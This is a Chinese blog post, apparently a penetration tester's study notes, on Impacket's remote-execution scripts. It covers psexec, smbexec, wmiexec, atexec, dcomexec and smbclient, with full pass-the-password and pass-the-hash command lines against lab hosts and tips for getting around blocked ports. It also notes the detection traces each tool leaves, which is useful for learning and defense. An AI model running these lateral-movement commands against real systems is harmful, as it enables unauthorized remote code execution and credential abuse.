---
title: "impacket使用总结"
date: 2025-12-11T00:00:00+08:00
draft: false
---

# impacket使用总结

impacket是一款用于处理网络协议的python类的集合

接下来记录其常用脚本使用方法（作者还没学到协议专题，暂未记录）

### 远程连接

有6个远程连接脚本可以使用明文密码和密码hash进行远程连接

* 对于域环境：连接域内普通主机，可以使用普通域用户账户，连接域控需要域管理员账户
* 对于工作组环境：vista之前的系统，可使用本地管理员组内用户进行连接，vista之后只能使用administrator（RID 500）

#### psexec.py

##### 连接原理

脚本会通过管道上传一个二进制文件到目标主机`C:\Windows`目录，并在目标机器上创建服务，通过该服务运行二进制文件，运行结束后删除服务和二进制文件（该脚本上传的二进制文件和创建的服务名都是随机的）

##### 特征

脚本创建和删除服务会产生大量日志，攻击溯源时能够通过日志反推攻击流程

##### 连接条件

* 目标主机开启445端口
* 目标主机开启IPC$和非IPC$的任意可写共享

##### 连接

* 使用密码：

  ~~~cmd
  python psexec.py yuy0ung/administrator:Admin123456@192.168.111.137
  # 用/表示域环境
  ~~~

  ![image-20241101230024951](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241101230026631-1393962198.png)

* 使用hash：

  ~~~cmd
  python psexec.py yuy0ung/administrator@192.168.111.137 -hashes :ae4c0d5fb959fda8f4cb1d14a8376af4 -codec gbk
  ~~~

  ![image-20241101230255338](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241101230256267-592313109.png)


#### smbexec.py

##### 连接原理

一个类似psexec的使用RemComSvc技术的工具，通过文件共享在远程系统中创建服务，将要执行的命令通过服务写在bat文件中来执行，然后将执行结果写在文件中来获取执行命令的结果，最后删除bat文件、输出文件、服务

##### 特征

* 创建和删除服务会产生大量日志，溯源时可通过日志反推攻击流程

* windows defender会对工具进行查杀，查杀后会导致报错

* 正常运行脚本，创建的服务名叫BTBTO，固定不变

  服务文件名是要执行的命令：

  ~~~cmd
  %COMPEC /Q /c echo cd ^> \\127.0.0.1\C$\__output 2^>^&1 > %TEMP%\execute.bat & del %TEMP%\execute.bat
  ~~~

  命令效果：

  * 将命令写入`C:\windows\temp\execute.bat`
  * 执行`C:\windows\temp\execute.bat`
  * 删除`C:\windows\temp\execute.bat`
  * 从`C:\__output`文件中获取命令执行结果
  * 删除`C:\__output`

##### 连接条件

* 目标主机开启445端口
* 目标主机开启IPC$和非IPC$的任意可写共享
* 可以使用除ipc$外的其他所有共享
* 脚本默认C$共享，-share可指定其他共享

##### 连接

* 使用密码：

  ~~~cmd
  python smbexec.py yuy0ung/administrator:Admin123456@192.168.111.137 -codec gbk
  # -codec gbk	使用gbk字符集防止乱码
  ~~~

  ![image-20241102013827521](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241102013830360-147866540.png)

* 使用密码hash：

  ~~~cmd
  python smbexec.py yuy0ung/administrator@192.168.111.137 -hashes :ae4c0d5fb959fda8f4cb1d14a8376af4 -codec gbk
  ~~~

  ![image-20241102014143863](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241102014146559-1983237497.png)

#### wmiexec.py

##### 连接原理

通过wmi实现命令执行，命令的结果写入文件，然后再调用smb把回显读取出来，然后再传送回来

##### 特征

特征不大，规避AV方面做得最好

##### 连接条件

* 目标主机开启135（用来执行命令）和445（用来读取回显）端口
* 开启admin$共享

##### 连接

* 使用密码：

  ~~~cmd
  python wmiexec.py yuy0ung/administrator:Admin123456@192.168.111.137 -codec gbk
  ~~~

  ![image-20241102014906882](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241102014909401-1224907621.png)

* 使用密码hash

  ~~~cmd
  python wmiexec.py yuy0ung/administrator@192.168.111.137 -hashes :ae4c0d5fb959fda8f4cb1d14a8376af4 -codec gbk
  ~~~

  ![image-20241102015116093](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241102015118939-471344913.png)

##### 实战的一些情况

* **COM被ban**

  如果关闭了远程的COM组件调用，就无法执行wmi

  com组件是支撑wmi执行命令的组件，被禁用了，就算通信层面再怎么换，也没法最终成功执行，所以这里没有解决方案

* **445端口被ban但135还在**

  因为在wmiexec中，445端口只用于回显命令执行结果，所以并不影响执行命令，可以使用`-nooutput`参数选择无回显执行来bypass

* **135，445都打开了，但桌面端有杀软**

  待更新

#### atexec.py

##### 连接原理

通过计划任务服务（task schaduler）在目标主机上执行命令，并返回执行命令的输出结果

##### 连接

* 使用密码

  ~~~cmd
  python atexec.py yuy0ung/administrator:Admin123456@192.168.111.137 whoami -codec gbk
  ~~~

  ![image-20241102015519566](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241102015522393-234365602.png)

* 使用密码hash

  ~~~cmd
  python atexec.py yuy0ung/administrator@192.168.111.137 whoami -hashes :ae4c0d5fb959fda8f4cb1d14a8376af4 -codec gbk
  ~~~

  ![image-20241102015653670](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241102015656347-1211217995.png)

#### dcomexec.py

##### 连接原理

通过dcom在目标主机上执行命令并返回结果

##### 连接

域环境未成功，建议在工作组环境尝试

* 使用密码：

  ~~~cmd
  python dcomexec.py Administrator:123456@192.168.111.134 -codec gbk
  ~~~

  ![image-20241102020617586](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241102020620428-1842082805.png)

* 使用密码hash

  ~~~cmd
  python dcomexec.py Administrator@192.168.111.134 -hashes :32ed87bdb5fdc5e9cba88547376818d4 -codec gbk
  ~~~

  ![image-20241102021608140](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241102021610734-466146952.png)

#### smbclient.py

可以向服务器上传文件

##### 连接

* 使用密码

  ~~~cmd
  python smbclient.py yuy0ung/administrator:Admin123456@192.168.111.137
  ~~~

  连接后可以执行如下命令：

  ~~~cmd
  info	# 查看信息
  shares	# 查看开启的共享
  use xx	# 使用指定的共享
  ls		# 查看当前目录的文件
  cd		# 切换路径
  put xx	# 上传文件
  get xx	# 下载文件
  ~~~

  ![image-20241102022445492](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241102022448456-896518873.png)

* 使用密码hash：

  ~~~cmd
  python smbclient.py yuy0ung/administrator@192.168.111.137 -hashes :32ed87bdb5fdc5e9cba88547376818d4
  ~~~

  ![image-20241102022633494](https://img2023.cnblogs.com/blog/3450279/202411/3450279-20241102022636065-489855295.png)



（未完待续）